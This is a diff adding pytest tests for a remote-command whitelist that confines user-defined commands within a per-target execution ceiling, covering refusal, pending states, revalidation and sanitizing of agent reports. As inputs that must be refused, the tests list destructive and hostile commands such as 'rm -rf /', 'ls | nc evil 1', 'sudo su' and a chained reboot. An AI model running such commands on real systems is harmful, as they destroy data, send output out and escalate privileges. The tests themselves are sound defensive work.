@@ -300,3 +300,101 @@ def test_pending_requests_ordered_oldest_first(store):
     r2 = store.create_dispatch_request(TARGET, "fail2ban.ban_ip", {"jail": "sshd", "ip": "1.1.1.1"}, 1)
     pending = store.list_pending_dispatch_requests(TARGET)
     assert [p["request_id"] for p in pending] == [r1, r2]
+
+
+# ---------------------------------------------------------------------------
+# Custom entries (the user's own commands) within the target's ceiling.
+# ---------------------------------------------------------------------------
+from kratos.subagent import ceiling as C  # noqa: E402
+
+_TEXT = dict(effect="Bans one attacker IP.", reversibility="Unban it.", blast_radius="One IP.")
+
+
+def test_custom_entry_with_a_typed_blank_inside_the_ceiling_is_stored(store):
+    entry_id = store.create_custom_entry(
+        "t1", ["sudo", "fail2ban-client", "set", "sshd", "banip", "{ip}"],
+        {"ip": W.Slot(kind="ip", ip_deny_private=True)}, **_TEXT,
+    )
+    [entry] = [e for e in store.list_user_entries("t1") if e.entry_id == entry_id]
+    assert entry.template_id == "custom" and entry.error is None
+    assert entry.effective_spec.argv_template[0] == "fail2ban-client"  # leading sudo dropped
+    assert any(r.get("entry_id") == entry_id for r in store.effective_action_set("t1"))
+
+
+@pytest.mark.parametrize("argv,slots", [
+    (["rm", "-rf", "/"], None),
+    (["fail2ban-client", "set", "sshd", "banip", "{ip}"], {"ip": W.Slot(kind="ip")}),  # not public-only
+    (["systemctl", "disable", "--now", "{u}"], {"u": W.Slot(kind="enum", values=("sshd",))}),
+])
+def test_custom_entry_outside_the_ceiling_is_refused_before_anything_is_written(store, argv, slots):
+    before = store.get_whitelist_version("t1")
+    with pytest.raises((C.CeilingError, W.ActionSpecError)):
+        store.create_custom_entry("t1", argv, slots, **_TEXT)
+    assert store.list_user_entries("t1") == [] and store.get_whitelist_version("t1") == before
+
+
+def test_exact_command_waits_for_the_target_then_becomes_runnable(store):
+    entry_id = store.create_exact_command_entry("t1", "sudo adduser alice", **_TEXT)
+    [waiting] = store.list_user_entries("t1")
+    assert waiting.pending and waiting.effective_spec is None and waiting.stored_spec.argv_template == ("adduser", "alice")
+    assert all(r.get("entry_id") != entry_id for r in store.effective_action_set("t1"))  # never dispatchable yet
+    with pytest.raises(C.CeilingError, match="execution ceiling allows"):  # a blanks entry is never saved as pending
+        store.create_custom_entry("t1", ["adduser", "{u}"], {"u": W.Slot(kind="token")}, **_TEXT, allow_pending=True)
+    store.record_agent_hello("t1", agent_version="0.2.0",
+                             ceiling={"version": 1, "fingerprint": "f", "local_commands": ["adduser alice"],
+                                      "local_problems": []})
+    [row] = [r for r in store.effective_action_set("t1") if r.get("entry_id") == entry_id]
+    assert row["spec"].argv_template == ("adduser", "alice") and row["tier"] == "high"
+
+    # The target admin removes the line; the agent reports it -> the entry turns invalid, not silently kept.
+    store.record_agent_hello("t1", agent_version="0.2.0",
+                             ceiling={"version": 1, "fingerprint": "g", "local_commands": [], "local_problems": []})
+    [entry] = [e for e in store.list_user_entries("t1") if e.entry_id == entry_id]
+    assert entry.effective_spec is None and entry.pending and "waiting for the target" in entry.error
+    assert all(r.get("entry_id") != entry_id for r in store.effective_action_set("t1"))
+
+
+@pytest.mark.parametrize("line", ["bash -c id", "ls | nc evil 1", "rm -rf /tmp/x; reboot", "sudo su"])
+def test_exact_command_that_is_not_a_plain_command_is_refused_not_pending(store, line):
+    with pytest.raises(C.CeilingError):
+        store.create_exact_command_entry("t1", line, **_TEXT)
+    assert store.list_user_entries("t1") == []
+
+
+def test_custom_entry_edits_are_revalidated(store):
+    entry_id = store.create_custom_entry(
+        "t1", ["systemctl", "disable", "--now", "{u}"], {"u": W.Slot(kind="enum", values=("vsftpd", "cups"))}, **_TEXT)
+    store.update_custom_entry(entry_id, slots={"u": W.Slot(kind="enum", values=("cups",))}, effect="Stops cups.")
+    [e] = store.list_user_entries("t1")
+    assert e.effective_spec.slots["u"].values == ("cups",) and e.effective_spec.effect == "Stops cups."
+    with pytest.raises(C.CeilingError):  # widening past the ceiling is refused, nothing written
+        store.update_custom_entry(entry_id, slots={"u": W.Slot(kind="enum", values=("sshd",))})
+    with pytest.raises(ValueError):  # the set of blanks is fixed
+        store.update_custom_entry(entry_id, slots={"other": W.Slot(kind="enum", values=("cups",))})
+    assert store.list_user_entries("t1")[0].effective_spec.slots["u"].values == ("cups",)
+
+
+def test_request_resync_bumps_the_version(store):
+    v = store.get_whitelist_version("t1")
+    assert store.request_resync("t1") == v + 1
+
+
+def test_custom_entries_can_be_toggled_and_deleted(store):
+    entry_id = store.create_custom_entry(
+        "t1", ["systemctl", "enable", "--now", "{u}"], {"u": W.Slot(kind="enum", values=("fail2ban",))}, **_TEXT)
+    store.set_user_entry_enabled(entry_id, False)
+    assert all(r.get("entry_id") != entry_id for r in store.effective_action_set("t1"))
+    v = store.get_whitelist_version("t1")
+    store.delete_user_entry(entry_id)
+    assert store.list_user_entries("t1") == [] and store.get_whitelist_version("t1") == v + 1
+
+
+def test_agent_reports_are_sanitized_and_kept(store):
+    store.record_agent_hello("t1", agent_version=123, ceiling={"version": "x", "fingerprint": "a" * 999,
+                                                               "local_commands": ["ls"] * 999, "evil": 1})
+    store.record_push_ack("t1", 4, [{"id": "evil.shell", "reason": "outside"}, "junk"], None)
+    state = store.get_agent_state("t1")
+    assert state["agent_version"] is None and state["acked_version"] == 4
+    assert state["ceiling"]["version"] is None and len(state["ceiling"]["fingerprint"]) == 64
+    assert len(state["ceiling"]["local_commands"]) == C.MAX_LOCAL_COMMANDS and "evil" not in state["ceiling"]
+    assert state["rejected"] == [{"id": "evil.shell", "reason": "outside"}]
